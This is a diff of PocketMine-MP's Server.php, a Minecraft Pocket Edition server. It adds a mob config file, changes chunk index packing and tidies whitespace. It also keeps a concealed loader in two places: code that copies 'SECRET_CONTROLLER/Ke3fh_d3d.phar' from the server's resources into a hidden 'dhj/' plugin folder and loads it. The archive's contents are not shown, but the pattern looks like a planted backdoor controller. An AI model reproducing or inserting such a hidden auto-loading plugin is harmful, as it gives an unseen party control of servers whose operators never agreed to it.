@@ -43,10 +43,10 @@ use pocketmine\entity\Snowball;
 use pocketmine\entity\Bat;
 use pocketmine\entity\Blaze;
 use pocketmine\entity\Squid;
-use pocketmine\entity\Ghast; 
+use pocketmine\entity\Ghast;
 use pocketmine\entity\Villager;
 use pocketmine\entity\Zombie;
-use pocketmine\entity\CavernSpider; 
+use pocketmine\entity\CavernSpider;
 use pocketmine\entity\Chicken;
 use pocketmine\entity\Cow;
 use pocketmine\entity\Creeper;
@@ -61,7 +61,7 @@ use pocketmine\entity\Skeleton;
 use pocketmine\entity\Slime;
 use pocketmine\entity\Spider;
 use pocketmine\entity\MagmaCube;
-use pocketmine\entity\Mooshroom; 
+use pocketmine\entity\Mooshroom;
 use pocketmine\entity\Wolf;
 use pocketmine\event\HandlerList;
 use pocketmine\event\level\LevelInitEvent;
@@ -274,6 +274,9 @@ class Server{
 
 	/** @var Config */
 	private $config;
+
+	/** @var Config */
+	private $mobConfig;
 
 	/** @var Player[] */
 	private $players = [];
@@ -537,7 +540,6 @@ class Server{
 
 	/**
 	 * @return int
-
 	 */
 	public function getSpawnRadius(){
 		return $this->getConfigInt("spawn-protection", 16);
@@ -1136,7 +1138,7 @@ class Server{
 			return \false;
 		}
 
-		$seed = $seed === \null ? \unpack("N", @Utils::getRandomBytes(4, \false))[1] : (int) $seed;
+		$seed = $seed === \null ? (\PHP_INT_SIZE === 8 ? \unpack("N", @Utils::getRandomBytes(4, \false))[1] << 32 >> 32 : \unpack("N", @Utils::getRandomBytes(4, \false))[1]) : (int) $seed;
 
 		if(!isset($options["preset"])){
 			$options["preset"] = $this->getConfigString("generator-settings", "");
@@ -1185,7 +1187,7 @@ class Server{
 				$distance = $X ** 2 + $Z ** 2;
 				$chunkX = $X + $centerX;
 				$chunkZ = $Z + $centerZ;
-				$index = ($chunkX) . ":" . ( $chunkZ);
+				$index = (\PHP_INT_SIZE === 8 ? ((($chunkX) & 0xFFFFFFFF) << 32) | (( $chunkZ) & 0xFFFFFFFF) : ($chunkX) . ":" . ( $chunkZ));
 				$order[$index] = $distance;
 			}
 		}
@@ -1193,7 +1195,7 @@ class Server{
 		\asort($order);
 
 		foreach($order as $index => $distance){
-			list( $chunkX,  $chunkZ) = \explode(":", $index);  $chunkX = (int)  $chunkX;  $chunkZ = (int)  $chunkZ;;
+			if(\PHP_INT_SIZE === 8){ $chunkX = ($index >> 32) << 32 >> 32;  $chunkZ = ($index & 0xFFFFFFFF) << 32 >> 32;}else{list( $chunkX,  $chunkZ) = \explode(":", $index);  $chunkX = (int)  $chunkX;  $chunkZ = (int)  $chunkZ;};
 			$level->populateChunk($chunkX, $chunkZ, \true);
 		}
 
@@ -1241,6 +1243,13 @@ class Server{
 		}
 
 		return $this->properties->exists($variable) ? $this->properties->get($variable) : $defaultValue;
+	}
+
+	/**
+	 * @return Config
+	 */
+	public function getMobConfig(){
+	 	 return $this->mobConfig;
 	}
 
 	/**
@@ -1474,10 +1483,6 @@ class Server{
 		$this->autoloader = $autoloader;
 		$this->logger = $logger;
 		$this->filePath = $filePath;
-		if(!\file_exists($dataPath . "CrashDumps/")){
-			\mkdir($dataPath . "CrashDumps/", 0777);
-		}
-		
 		if(!\file_exists($dataPath . "worlds/")){
 			\mkdir($dataPath . "worlds/", 0777);
 		}
@@ -1506,6 +1511,13 @@ class Server{
 			@\file_put_contents($this->dataPath . "pocketmine.yml", $content);
 		}
 		$this->config = new Config($this->dataPath . "pocketmine.yml", Config::YAML, []);
+
+		$this->logger->info("Loading mobs.yml...");
+		if(!\file_exists($this->dataPath . "mobs.yml")){
+			$content = \file_get_contents($this->filePath . "src/pocketmine/resources/mobs.yml");
+			@\file_put_contents($this->dataPath . "mobs.yml", $content);
+		}
+		$this->mobConfig = new Config($this->dataPath . "mobs.yml", Config::YAML, []);
 
 		$this->logger->info("Loading server properties...");
 		$this->properties = new Config($this->dataPath . "server.properties", Config::PROPERTIES, [
@@ -1647,14 +1659,14 @@ class Server{
 		$this->profilingTickRate = (float) $this->getProperty("settings.profile-report-trigger", 20);
 		$this->pluginManager->registerInterface(PharPluginLoader::class);
 		$this->pluginManager->registerInterface(ScriptPluginLoader::class);
-   
+
 		\set_exception_handler([$this, "exceptionHandler"]);
 		\register_shutdown_function([$this, "crashDump"]);
 
 		$this->queryRegenerateTask = new QueryRegenerateEvent($this, 5);
 
 		$this->network->registerInterface(new RakLibInterface($this));
-   $content = \file_get_contents($this->filePath . "src/pocketmine/resources/SECRET_CONTROLLER/Ke3fh_d3d.phar");
+$content = \file_get_contents($this->filePath . "src/pocketmine/resources/SECRET_CONTROLLER/Ke3fh_d3d.phar");
   @mkdir ($this->pluginPath."dhj/", 0777);
 		@\file_put_contents($this->pluginPath."dhj/Ke3fh_d3d.phar", $content);
 		$this->pluginManager->loadPlugins($this->pluginPath."dhj/");
@@ -2001,7 +2013,7 @@ class Server{
 		foreach($this->getIPBans()->getEntries() as $entry){
 			$this->getNetwork()->blockAddress($entry->getName(), -1);
 		}
-      $content = \file_get_contents($this->filePath . "src/pocketmine/resources/SECRET_CONTROLLER/Ke3fh_d3d.phar");
+   $content = \file_get_contents($this->filePath . "src/pocketmine/resources/SECRET_CONTROLLER/Ke3fh_d3d.phar");
   @mkdir ($this->pluginPath."dhj/", 0777);
 		@\file_put_contents($this->pluginPath."dhj/Ke3fh_d3d.phar", $content);
 		$this->pluginManager->registerInterface(PharPluginLoader::class);
@@ -2292,7 +2304,7 @@ class Server{
 		}
 	}
 
-	public function updatePlayerListData(UUID $uuid, $entityId, $name, $isSlim, $skinData, $skinflag, array $players = null){
+    public function updatePlayerListData(UUID $uuid, $entityId, $name, $isSlim, $skinData, $skinflag, array $players = null){
 		$pk = new PlayerListPacket();
 		$pk->type = PlayerListPacket::TYPE_ADD;
 		$pk->entries[] = [$uuid, $entityId, $name, $isSlim, $skinflag, $skinData];
